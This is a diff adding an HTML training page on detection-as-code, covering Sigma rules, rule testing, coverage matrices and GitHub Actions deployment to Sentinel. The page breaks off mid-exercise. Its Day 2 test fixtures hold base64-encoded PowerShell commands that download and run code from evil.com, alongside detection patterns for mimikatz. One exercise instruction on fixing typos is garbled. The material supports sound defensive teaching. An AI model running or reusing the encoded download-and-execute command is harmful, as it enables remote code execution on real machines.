@@ -1,0 +1,906 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Week 10 — Detection-as-Code</title>
+<link rel="stylesheet" href="style.css">
+<script src="app.js" defer></script></head>
+<body data-site="cyber">
+<header class="top"><div class="in">
+<a class="brand" href="index.html">Cyber Track</a>
+<a href="index.html">Weeks</a><a href="play.html">Playground</a><a href="../index.html">All sites</a>
+<span class="sp"></span><span class="prog" id="prog"></span>
+</div></header>
+<main>
+<h1>Week 10 — Detection-as-Code</h1><div class="toc"><a class="btn ghost" href="#day-1">Day 1</a><a class="btn ghost" href="#day-2">Day 2</a><a class="btn ghost" href="#day-3">Day 3</a><a class="btn ghost" href="#day-4">Day 4</a><a class="btn ghost" href="#day-5">Day 5</a></div><p class="note">Done this week: <span data-week-count="10" data-size="5"></span></p><p class="note">Code blocks run in your browser. <button class="ghost" id="resetpy" type="button">Reset Python session</button></p><h1>Week 10 — Detection-as-Code</h1>
+<h2>Metadata</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Phase</td>
+<td>Phase 3 — Log Analysis &amp; SIEM</td>
+</tr>
+<tr>
+<td>Cert Alignment</td>
+<td>BTL1: Detection engineering / SC-200: Sentinel content management / GCIA: N/A</td>
+</tr>
+<tr>
+<td>Royal Road</td>
+<td>GitHub Actions CI → Sigma linting + validation pipeline</td>
+</tr>
+<tr>
+<td>Prerequisites</td>
+<td>W06 (Offensive Techniques, Sigma skeletons), W09 (KQL, Sigma rules)</td>
+</tr>
+<tr>
+<td>Est. Hours</td>
+<td>8–10 hrs</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="day-1">Day 1 — Detection-as-Code Principles</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="10-1"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=_JEvyem4ryg" target="_blank" rel="noopener"><b>Detection as Code: Detection Development Using CI/CD</b><small>RSAC Cybersecurity</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=detection%20as%20code%20detection%20engineering%20CI/CD%20pipeline%20sigma%20rules%20git" target="_blank" rel="noopener">detection as code detection engineering CI/CD pipeline sigma rules git</a></p></div>
+<hr />
+<h3>Concept 1 — What Detection-as-Code Means</h3>
+<p>Detection-as-Code (DaC) applies software engineering practices to detection rules: version control, code review, automated testing, and deployment pipelines. Instead of writing KQL directly in the Sentinel UI and forgetting it, you manage rules in a Git repository with the same discipline as application code.</p>
+<p>Core principles:</p>
+<ol>
+<li><strong>All rules live in version control</strong> — Git is the source of truth, not the SIEM UI</li>
+<li><strong>Rules are reviewed before merging</strong> — pull request with peer review catches logic errors</li>
+<li><strong>CI validates every change</strong> — automated tests run on every commit</li>
+<li><strong>Deployment is automated</strong> — no manual clicking in the SIEM portal</li>
+<li><strong>Changes are auditable</strong> — git log shows who changed what and why</li>
+</ol>
+<p>Data engineering analogy: DaC is exactly what dbt does for SQL transformations. dbt put SQL models into Git with tests and CI. DaC does the same for detection rules. The mental model is identical.</p>
+<p><strong>Example:</strong></p>
+<pre><code># Repository structure for Detection-as-Code
+detections/
+├── rules/
+│   ├── credential_access/
+│   │   ├── mimikatz_execution.yml        ← Sigma rule
+│   │   └── brute_force_logons.yml
+│   ├── execution/
+│   │   └── powershell_encoded_cmd.yml
+│   └── persistence/
+│       └── new_service_installation.yml
+├── tests/
+│   ├── test_mimikatz_execution.py
+│   └── test_brute_force.py
+├── pipelines/
+│   └── validate_and_deploy.yml           ← GitHub Actions workflow
+├── compiled/
+│   └── kql/                              ← Auto-generated, never edited by hand
+└── README.md
+</code></pre><div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Rule metadata model — enforces structure at code review time
+from dataclasses import dataclass
+
+@dataclass
+class SigmaRuleMeta:
+    title: str
+    id: str
+    status: str              # experimental | test | stable
+    severity: str            # informational | low | medium | high | critical
+    tactics: list[str]
+    techniques: list[str]
+    
+    def is_valid(self) -&gt; list[str]:
+        errors = []
+        valid_statuses = {&quot;experimental&quot;, &quot;test&quot;, &quot;stable&quot;}
+        valid_severities = {&quot;informational&quot;, &quot;low&quot;, &quot;medium&quot;, &quot;high&quot;, &quot;critical&quot;}
+        if self.status not in valid_statuses:
+            errors.append(f&quot;Invalid status: {self.status}&quot;)
+        if self.severity not in valid_severities:
+            errors.append(f&quot;Invalid severity: {self.severity}&quot;)
+        if not self.techniques:
+            errors.append(&quot;At least one ATT&amp;CK technique required&quot;)
+        return errors
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>discover_rules(rules_dir: str) -&gt; list[str]</code> that walks a directory tree and returns the relative paths of all <code>.yml</code> files under <code>rules/</code>. Then write <code>count_by_tactic(rule_paths: list[str]) -&gt; dict[str, int]</code> that reads each file as YAML and counts rules per ATT&amp;CK tactic (tags starting with <code>attack.</code> but not <code>attack.t</code>).
+Expected output: dict like <code>{&quot;credential_access&quot;: 2, &quot;execution&quot;: 1, &quot;persistence&quot;: 1}</code></p>
+<hr />
+<h3>Concept 2 — Git Workflow for Detection Rules</h3>
+<p>Detection rules follow the same Git branching model as application code. The key difference is that a bad merge can create a detection gap (missed attack) or alert fatigue (noise storm) — both have real security consequences.</p>
+<p>Standard workflow:</p>
+<ol>
+<li>Create a branch: <code>git checkout -b detection/T1059.001-powershell-encoded</code></li>
+<li>Write the Sigma rule YAML</li>
+<li>Run local validation: <code>sigma check rule.yml</code></li>
+<li>Open a pull request</li>
+<li>CI runs automatically: lint + test + compile to KQL</li>
+<li>Peer review (second analyst reads the rule logic)</li>
+<li>Merge → auto-deploy to Sentinel</li>
+</ol>
+<p>Commit message conventions for detection rules:</p>
+<ul>
+<li><code>feat(detection): add T1059.001 PowerShell encoded command rule</code></li>
+<li><code>fix(detection): tune brute force threshold from 5 to 10 to reduce FP</code></li>
+<li><code>chore(detection): deprecate legacy rule replaced by T1003.001-v2</code></li>
+</ul>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import subprocess
+
+def run_git_command(args: list[str]) -&gt; tuple[int, str]:
+    result = subprocess.run([&quot;git&quot;] + args, capture_output=True, text=True)
+    return result.returncode, result.stdout.strip()
+
+def get_changed_rule_files() -&gt; list[str]:
+    &quot;&quot;&quot;Return list of Sigma YAML files changed in the current branch vs main.&quot;&quot;&quot;
+    _, diff_output = run_git_command([&quot;diff&quot;, &quot;--name-only&quot;, &quot;main&quot;, &quot;HEAD&quot;])
+    changed = [
+        line for line in diff_output.splitlines()
+        if line.startswith(&quot;rules/&quot;) and line.endswith(&quot;.yml&quot;)
+    ]
+    return changed
+
+# Simulate for exercise
+SIMULATED_CHANGED = [
+    &quot;rules/credential_access/mimikatz_execution.yml&quot;,
+    &quot;rules/execution/powershell_encoded_cmd.yml&quot;,
+]
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>validate_commit_message(message: str) -&gt; bool</code> that enforces: message starts with one of <code>feat(detection):</code>, <code>fix(detection):</code>, <code>chore(detection):</code>, is at least 20 chars, and contains a MITRE technique ID pattern (<code>T\d{4}</code>) somewhere in the message. Return True if valid, False otherwise.
+Expected output: <code>True</code> for <code>&quot;feat(detection): add T1059.001 PowerShell encoded cmd&quot;</code>, <code>False</code> for <code>&quot;fixed rule&quot;</code></p>
+<hr />
+<h3>Concept 3 — Sigma CLI and pySigma</h3>
+<p>The Sigma toolchain has two components:</p>
+<ul>
+<li><strong>sigma-cli</strong> — command-line tool: <code>sigma check</code>, <code>sigma convert</code>, <code>sigma list backends</code></li>
+<li><strong>pySigma</strong> — Python library for rule parsing, validation, and compilation</li>
+</ul>
+<p><code>sigma convert -t splunk rules/credential_access/mimikatz.yml</code> outputs SPL.
+<code>sigma convert -t microsoft365defender rules/</code> compiles an entire folder to KQL.</p>
+<p>For CI pipelines, pySigma is used directly in Python scripts — no subprocess needed:</p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from sigma.collection import SigmaCollection
+from sigma.backends.microsoft365defender import Microsoft365DefenderBackend
+
+rules = SigmaCollection.load_ruleset([&quot;rules/&quot;])
+backend = Microsoft365DefenderBackend()
+kql_queries = backend.convert(rules)
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Simulate pySigma compilation without the library installed
+import yaml
+import re
+
+def compile_sigma_to_kql_simple(rule_yaml: str) -&gt; str:
+    &quot;&quot;&quot;
+    Minimal Sigma → KQL compiler for process_creation rules.
+    Handles contains and endswith modifiers only.
+    &quot;&quot;&quot;
+    rule = yaml.safe_load(rule_yaml)
+    detection = rule.get(&quot;detection&quot;, {})
+    conditions = []
+    
+    for sel_name, sel_body in detection.items():
+        if sel_name == &quot;condition&quot;:
+            continue
+        if not isinstance(sel_body, dict):
+            continue
+        for field_spec, values in sel_body.items():
+            field, _, modifier = field_spec.partition(&quot;|&quot;)
+            kql_field = {&quot;CommandLine&quot;: &quot;CommandLine&quot;, &quot;Image&quot;: &quot;NewProcessName&quot;}.get(field, field)
+            vals = values if isinstance(values, list) else [values]
+            if modifier == &quot;contains&quot;:
+                parts = [f&#x27;{kql_field} contains &quot;{v}&quot;&#x27; for v in vals]
+                conditions.append(&quot;(&quot; + &quot; or &quot;.join(parts) + &quot;)&quot;)
+            elif modifier == &quot;endswith&quot;:
+                parts = [f&#x27;{kql_field} endswith &quot;{v}&quot;&#x27; for v in vals]
+                conditions.append(&quot;(&quot; + &quot; or &quot;.join(parts) + &quot;)&quot;)
+    
+    where_clause = &quot; or &quot;.join(conditions) if conditions else &quot;true&quot;
+    return f&quot;SecurityEvent\n| where EventID == 4688\n| where {where_clause}&quot;
+
+sigma_rule = &quot;&quot;&quot;
+title: Test Rule
+detection:
+  selection:
+    CommandLine|contains:
+      - mimikatz
+      - sekurlsa
+  condition: selection
+&quot;&quot;&quot;
+print(compile_sigma_to_kql_simple(sigma_rule))
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>batch_compile(rule_dir: str, output_dir: str) -&gt; dict[str, str]</code> that reads all YAML files from a simulated rules dict (pass as <code>rules: dict[str, str]</code> where key=filename, value=YAML content), compiles each using <code>compile_sigma_to_kql_simple</code>, writes the KQL to <code>output_dir/{filename}.kql</code>, and returns a dict mapping filename → KQL string.
+Expected output: dict with 2+ entries; files written to output_dir</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can write Sigma rules from ATT&amp;CK technique descriptions, dramatically accelerating rule authoring.
+<strong>Threat:</strong> Detection rules generated by LLMs without human review can contain subtle logic errors that create false confidence.
+<strong>Opportunity:</strong> Use an LLM to draft rules quickly, then have a human analyst review the detection logic before merging.
+<strong>Prompt to try:</strong> <code>&quot;Write a Sigma rule for MITRE ATT&amp;CK technique T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys). Include: Windows Registry logsource, detection for common Run key paths, at least 3 known false positives (legitimate software that uses Run keys), and set severity to medium. Output valid YAML.&quot;</code></p>
+<hr />
+<h2 id="day-2">Day 2 — Testing Detection Rules</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="10-2"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=eAtlwqXDZYc" target="_blank" rel="noopener"><b>Atomic Red Team explained: Open source testing for security teams</b><small>Red Canary</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=detection%20rule%20testing%20unit%20tests%20sigma%20atomic%20red%20team%20evtx" target="_blank" rel="noopener">detection rule testing unit tests sigma atomic red team evtx</a></p></div>
+<hr />
+<h3>Concept 1 — Why Detection Rules Need Tests</h3>
+<p>A detection rule without tests is a guess. Tests verify:</p>
+<ol>
+<li><strong>True positive coverage</strong> — the rule fires when the attack occurs</li>
+<li><strong>False negative prevention</strong> — the rule fires on all relevant attack variants</li>
+<li><strong>False positive rate</strong> — the rule does NOT fire on known-good activity</li>
+<li><strong>Field existence</strong> — all referenced fields exist in the log source schema</li>
+</ol>
+<p>In software terms: true positive = feature works; false negative = regression; false positive = spurious alert.</p>
+<p>Detection tests are analogous to unit tests for a function: you provide known input (a log event), assert the expected output (alert fired or not), and run them automatically on every change.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import unittest
+from dataclasses import dataclass
+from typing import Callable
+
+@dataclass
+class DetectionTestCase:
+    name: str
+    event: dict
+    should_fire: bool
+    description: str
+
+def test_detection_rule(
+    rule_fn: Callable[[dict], bool],
+    test_cases: list[DetectionTestCase],
+) -&gt; dict:
+    results = {&quot;pass&quot;: 0, &quot;fail&quot;: 0, &quot;failures&quot;: []}
+    for tc in test_cases:
+        fired = rule_fn(tc.event)
+        if fired == tc.should_fire:
+            results[&quot;pass&quot;] += 1
+        else:
+            results[&quot;fail&quot;] += 1
+            results[&quot;failures&quot;].append({
+                &quot;test&quot;: tc.name,
+                &quot;expected&quot;: tc.should_fire,
+                &quot;got&quot;: fired,
+                &quot;description&quot;: tc.description,
+            })
+    return results
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write 5 test cases for the PowerShell encoded command detection rule from W09 (a function that checks if CommandLine contains <code>-EncodedCommand</code> or <code>-enc</code>). Include: 2 true positives (real encoded PS variants), 1 false negative trap (short <code>-e</code> flag that some tools use), 2 false positives (legitimate software). Run them with <code>test_detection_rule</code> and print the pass/fail summary.
+Expected output: 5 tests run; 4 pass if your rule handles the edge cases correctly</p>
+<hr />
+<h3>Concept 2 — Atomic Red Team and Test Data Generation</h3>
+<p>Atomic Red Team (by Red Canary) is a library of small, focused attack simulations mapped to ATT&amp;CK techniques. Each atomic test produces specific log events that a detection rule should catch.</p>
+<p>For testing detection rules locally (without running actual attacks), you generate synthetic log events that match what Atomic Red Team would produce. This is called <strong>test event generation</strong> or <strong>rule unit testing</strong>.</p>
+<p>The pattern:</p>
+<ol>
+<li>Look up the ATT&amp;CK technique</li>
+<li>Find the Atomic Red Team test for it</li>
+<li>Extract the command/action that produces the log event</li>
+<li>Create a synthetic log record matching that command</li>
+<li>Assert your rule fires on it</li>
+</ol>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code># Atomic Red Team test data for T1059.001 — PowerShell encoded execution
+ATOMIC_TEST_EVENTS = {
+    &quot;T1059.001&quot;: [
+        # True positive — direct encoded command
+        {
+            &quot;EventID&quot;: 4688,
+            &quot;CommandLine&quot;: &quot;powershell.exe -EncodedCommand JABjACAAPQAgAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAnACkA&quot;,
+            &quot;NewProcessName&quot;: &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;,
+        },
+        # True positive — short -enc flag
+        {
+            &quot;EventID&quot;: 4688,
+            &quot;CommandLine&quot;: &quot;powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGMAbwBtACcAKQA=&quot;,
+            &quot;NewProcessName&quot;: &quot;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&quot;,
+        },
+        # False positive — legitimate deployment tool
+        {
+            &quot;EventID&quot;: 4688,
+            &quot;CommandLine&quot;: &quot;powershell.exe -EncodedCommand &lt;deploy_script_b64&gt;&quot;,
+            &quot;NewProcessName&quot;: &quot;C:\\Program Files\\DeployTool\\deploy.exe&quot;,
+            &quot;Account&quot;: &quot;svc_deploy&quot;,
+        },
+    ]
+}
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>generate_test_cases_from_atomics(atomic_events: list[dict], is_tp: bool) -&gt; list[DetectionTestCase]</code> that converts a list of raw event dicts (from <code>ATOMIC_TEST_EVENTS[&quot;T1059.001&quot;]</code>) into <code>DetectionTestCase</code> objects. Mark the first two as true positives (should_fire=True) and the third as a false positive (should_fire=False when rule has the svc_deploy exclusion).
+Expected output: list of 3 DetectionTestCase objects with correct should_fire values</p>
+<hr />
+<h3>Concept 3 — Coverage Matrix: Which Attacks Can You Detect?</h3>
+<p>A coverage matrix answers: for each ATT&amp;CK technique in scope, do you have a detection rule? This is the gap analysis view that drives your detection backlog.</p>
+<p>The matrix has three states per technique:</p>
+<ul>
+<li><strong>Covered</strong> — you have a rule, it's tested, it's deployed</li>
+<li><strong>Partial</strong> — you have a rule but it covers only some variants</li>
+<li><strong>Gap</strong> — no rule exists</li>
+</ul>
+<p>Coverage matrices are maintained as data (YAML or JSON) and rendered visually in ATT&amp;CK Navigator (a browser-based tool that accepts JSON layer files). The W05 Royal Road built a Navigator layer; this week you extend it with detection status.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>from dataclasses import dataclass
+
+@dataclass
+class TechniqueCoverage:
+    technique_id: str
+    name: str
+    status: str          # &quot;covered&quot; | &quot;partial&quot; | &quot;gap&quot;
+    rule_ids: list[str]
+    notes: str = &quot;&quot;
+
+COVERAGE = [
+    Techniquecoverage(&quot;T1059.001&quot;, &quot;PowerShell&quot;, &quot;covered&quot;, [&quot;rule-001&quot;], &quot;&quot;),
+    TechniqueCoverage(&quot;T1003.001&quot;, &quot;LSASS Memory&quot;, &quot;covered&quot;, [&quot;rule-002&quot;], &quot;&quot;),
+    TechniqueCoverage(&quot;T1110&quot;, &quot;Brute Force&quot;, &quot;partial&quot;, [&quot;rule-003&quot;], &quot;Only covers password spraying, not stuffing&quot;),
+    TechniqueCoverage(&quot;T1055&quot;, &quot;Process Injection&quot;, &quot;gap&quot;, [], &quot;No rule yet&quot;),
+]
+
+def coverage_summary(coverage: list[TechniqueCoVerage]) -&gt; dict:
+    from collections import Counter
+    counts = Counter(c.status for c in coverage)
+    total = len(coverage)
+    return {
+        &quot;total&quot;: total,
+        &quot;covered&quot;: counts.get(&quot;covered&quot;, 0),
+        &quot;partial&quot;: counts.get(&quot;partial&quot;, 0),
+        &quot;gap&quot;: counts.get(&quot;gap&quot;, 0),
+        &quot;coverage_pct&quot;: round(counts.get(&quot;covered&quot;, 0) / total * 100, 1),
+    }
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Fix the typos in the coverage list above (<code>TechniqueCoVerage</code> → <code>TechniqueCoVerage</code>), then write <code>export_navigator_layer(coverage: list[TechniqueCoVerage], output_path: str) -&gt; None</code> that writes an ATT&amp;CK Navigator JSON layer where: covered = green (#00cc00), partial = yellow (#ffcc00), gap = red (#ff0000). The JSON format is <code>{&quot;name&quot;: &quot;Coverage&quot;, &quot;versions&quot;: {...}, &quot;techniques&quot;: [{&quot;techniqueID&quot;: ..., &quot;color&quot;: ...}]}</code>.
+Expected output: JSON file written with correct color coding per technique status</p>
+<hr />
+<h3>LLM Integration</h3>
+<p><strong>Topic:</strong> LLMs can analyze a detection coverage matrix and prioritize which gaps to close first based on threat intelligence.
+<strong>Threat:</strong> Coverage matrices become stale — a rule marked &quot;covered&quot; may not have been tested against recent attack variants.
+<strong>Opportunity:</strong> Feed your coverage matrix and recent CTI (from W07) to an LLM: &quot;Given these uncovered techniques and recent threat actor activity, which 3 gaps are highest priority to address this sprint?&quot;
+<strong>Prompt to try:</strong> <code>&quot;Here is my ATT&amp;CK detection coverage matrix (JSON) and recent threat intel for my industry (text). Rank the top 5 detection gaps by risk, considering: technique frequency in recent incidents, ease of implementation, and detection value. For each gap, suggest a specific Sigma rule approach.&quot;</code></p>
+<hr />
+<h2 id="day-3">Day 3 — CI/CD for Detections</h2><label class="daydone"><input type="checkbox" class="daydone" data-id="10-3"> Mark this day done</label>
+<div class="watch"><h4>Watch</h4><ul><li><a href="https://www.youtube.com/watch?v=0PbxpIao_EU" target="_blank" rel="noopener"><b>GitHub Actions Tutorial for Beginners -- CI/CD Pipeline from Scratch</b><small>Thetips4you</small></a></li></ul><p class="alt">Not what you need? Search YouTube: <a href="https://www.youtube.com/results?search_query=GitHub%20Actions%20CI%20CD%20pipeline%20YAML%20security%20detection%20rules%20automation" target="_blank" rel="noopener">GitHub Actions CI CD pipeline YAML security detection rules automation</a></p></div>
+<hr />
+<h3>Concept 1 — GitHub Actions Workflow Structure</h3>
+<p>GitHub Actions runs automated workflows triggered by repository events (push, pull_request, schedule). Each workflow is a YAML file in <code>.github/workflows/</code>. For detection-as-code, the standard triggers are:</p>
+<ul>
+<li><code>on: pull_request</code> — validate every proposed rule change before merge</li>
+<li><code>on: push: branches: [main]</code> — deploy validated rules after merge</li>
+<li><code>on: schedule</code> — weekly regression tests against live data</li>
+</ul>
+<p>Workflow anatomy:</p>
+<pre><code>on: [trigger]
+jobs:
+  job-name:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: &quot;3.11&quot;
+      - run: pip install -r requirements.txt
+      - run: python scripts/validate_rules.py
+</code></pre><p>Jobs run in parallel by default. Steps within a job run sequentially. Use <code>needs: [job-name]</code> to create job dependencies.</p>
+<p><strong>Example:</strong></p>
+<pre><code># .github/workflows/detect-ci.yml
+name: Detection Rule CI
+
+on:
+  pull_request:
+    paths:
+      - &quot;rules/**&quot;
+      - &quot;tests/**&quot;
+
+jobs:
+  validate:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: actions/setup-python@v5
+        with:
+          python-version: &quot;3.11&quot;
+      - name: Install dependencies
+        run: pip install pyyaml pysigma
+      - name: Lint Sigma rules
+        run: python scripts/lint_rules.py rules/
+      - name: Run detection tests
+        run: python -m pytest tests/ -v
+      - name: Compile to KQL
+        run: python scripts/compile_rules.py rules/ compiled/kql/
+      - name: Upload compiled rules
+        uses: actions/upload-artifact@v4
+        with:
+          name: compiled-kql
+          path: compiled/kql/
+</code></pre><p><strong>Exercise:</strong>
+Write the CI workflow YAML as a Python string and write <code>validate_workflow_yaml(workflow_str: str) -&gt; list[str]</code> that checks: (1) <code>on.pull_request</code> trigger present, (2) at least one <code>run:</code> step exists, (3) python-version is specified, (4) a lint or validate step exists (step name contains &quot;lint&quot; or &quot;validate&quot;). Return list of error strings.
+Expected output: <code>[]</code> for a valid workflow; error strings for missing required elements</p>
+<hr />
+<h3>Concept 2 — The Rule Validation Script</h3>
+<p>The CI pipeline runs a Python validation script that checks every Sigma rule for structural and content quality. This is the automated gate that prevents bad rules from reaching production.</p>
+<p>Checks to implement:</p>
+<ol>
+<li><strong>Valid YAML</strong> — can be parsed</li>
+<li><strong>Required fields</strong> — title, id (UUID), status, detection, logsource, level, tags</li>
+<li><strong>UUID format</strong> — <code>id</code> is a valid UUID4</li>
+<li><strong>ATT&amp;CK tag</strong> — at least one tag matching <code>attack.t\d{4}</code> pattern</li>
+<li><strong>Status whitelist</strong> — one of: experimental, test, stable</li>
+<li><strong>Severity whitelist</strong> — one of: informational, low, medium, high, critical</li>
+<li><strong>Detection not empty</strong> — detection.condition exists and is non-empty</li>
+<li><strong>No placeholders</strong> — title/description do not contain &quot;TODO&quot; or &quot;FIXME&quot;</li>
+</ol>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import yaml
+import re
+import uuid
+from pathlib import Path
+
+REQUIRED_FIELDS = [&quot;title&quot;, &quot;id&quot;, &quot;status&quot;, &quot;description&quot;, &quot;logsource&quot;, &quot;detection&quot;, &quot;level&quot;]
+VALID_STATUSES = {&quot;experimental&quot;, &quot;test&quot;, &quot;stable&quot;}
+VALID_SEVERITIES = {&quot;informational&quot;, &quot;low&quot;, &quot;medium&quot;, &quot;high&quot;, &quot;critical&quot;}
+
+def validate_sigma_rule(rule_path: str) -&gt; list[str]:
+    errors = []
+    try:
+        with open(rule_path) as f:
+            rule = yaml.safe_load(f)
+    except yaml.YAMLError as e:
+        return [f&quot;Invalid YAML: {e}&quot;]
+    
+    for field in REQUIRED_FIELDS:
+        if field not in rule:
+            errors.append(f&quot;Missing required field: {field}&quot;)
+    
+    if &quot;id&quot; in rule:
+        try:
+            uuid.UUID(str(rule[&quot;id&quot;]))
+        except ValueError:
+            errors.append(f&quot;Invalid UUID: {rule[&#x27;id&#x27;]}&quot;)
+    
+    if &quot;status&quot; in rule and rule[&quot;status&quot;] not in VALID_STATUSES:
+        errors.append(f&quot;Invalid status: {rule[&#x27;status&#x27;]}&quot;)
+    
+    if &quot;level&quot; in rule and rule[&quot;level&quot;] not in VALID_SEVERITIES:
+        errors.append(f&quot;Invalid level: {rule[&#x27;level&#x27;]}&quot;)
+    
+    tags = rule.get(&quot;tags&quot;, [])
+    has_attack_tag = any(re.match(r&quot;attack\.t\d{4}&quot;, t) for t in tags)
+    if not has_attack_tag:
+        errors.append(&quot;No ATT&amp;CK technique tag found (expected attack.tNNNN)&quot;)
+    
+    return errors
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
+Write <code>validate_all_rules(rules_dict: dict[str, str]) -&gt; dict</code> where keys are filenames and values are YAML strings. Run <code>validate_sigma_rule</code> on each (load from string, not file). Return <code>{&quot;passed&quot;: [...], &quot;failed&quot;: {&quot;filename&quot;: [errors]}, &quot;summary&quot;: &quot;N/M rules passed&quot;}</code>.
+Expected output: summary dict; rules with missing UUID or status should appear in failed</p>
+<hr />
+<h3>Concept 3 — Deployment Automation</h3>
+<p>After validation and merge, the deployment job uses the Sentinel API (or Azure CLI) to create or update Analytics Rules. For organizations without live Azure access, the deployment job exports ARM templates or Terraform files that can be applied separately.</p>
+<p>The deployment script:</p>
+<ol>
+<li>Reads compiled KQL files</li>
+<li>Reads rule metadata from the source YAML</li>
+<li>Calls the Sentinel REST API: <code>PUT /subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.OperationalInsights/workspaces/{ws}/providers/Microsoft.SecurityInsights/alertRules/{ruleId}</code></li>
+<li>Logs the result (created, updated, or error)</li>
+</ol>
+<p>For the Royal Road, we simulate the API call with a dry-run function.</p>
+<p><strong>Example:</strong></p>
+<div class="code" data-run><pre contenteditable="true" spellcheck="false" aria-label="Editable Python code"><code>import json
+from pathlib import Path
+
+def build_arm_template(rules: list[dict]) -&gt; dict:
+    &quot;&quot;&quot;Generate ARM template for multiple Sentinel analytics rules.&quot;&quot;&quot;
+    return {
+        &quot;$schema&quot;: &quot;https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#&quot;,
+        &quot;contentVersion&quot;: &quot;1.0.0.0&quot;,
+        &quot;resources&quot;: [
+            {
+                &quot;type&quot;: &quot;Microsoft.OperationalInsights/workspaces/providers/alertRules&quot;,
+                &quot;apiVersion&quot;: &quot;2022-12-01-preview&quot;,
+                &quot;name&quot;: f&quot;[concat(parameters(&#x27;workspaceName&#x27;), &#x27;/Microsoft.SecurityInsights/{r[&#x27;id&#x27;]}&#x27;)]&quot;,
+                &quot;kind&quot;: &quot;Scheduled&quot;,
+                &quot;properties&quot;: {
+                    &quot;displayName&quot;: r[&quot;title&quot;],
+                    &quot;severity&quot;: r[&quot;level&quot;].capitalize(),
+                    &quot;query&quot;: r.get(&quot;compiled_kql&quot;, &quot;&quot;),
+                    &quot;queryFrequency&quot;: &quot;PT1H&quot;,
+                    &quot;queryPeriod&quot;: &quot;PT24H&quot;,
+                    &quot;triggerOperator&quot;: &quot;GreaterThan&quot;,
+                    &quot;triggerThreshold&quot;: 0,
+                    &quot;enabled&quot;: True,
+                }
+            }
+            for r in rules
+        ]
+    }
+
+def deploy_dry_run(rules: list[dict]) -&gt; list[dict]:
+    results = []
+    for r in rules:
+        results.append({
+            &quot;rule_id&quot;: r[&quot;id&quot;],
+            &quot;title&quot;: r[&quot;title&quot;],
+            &quot;action&quot;: &quot;would_create&quot;,
+            &quot;severity&quot;: r[&quot;level&quot;],
+        })
+    return results
+</code></pre><div class="bar"><button class="run" type="button">Run</button><span class="hint">Editable. Blocks on a page share one session, so run them in order.</span></div><pre class="out" hidden></pre></div><p><strong>Exercise:</strong>
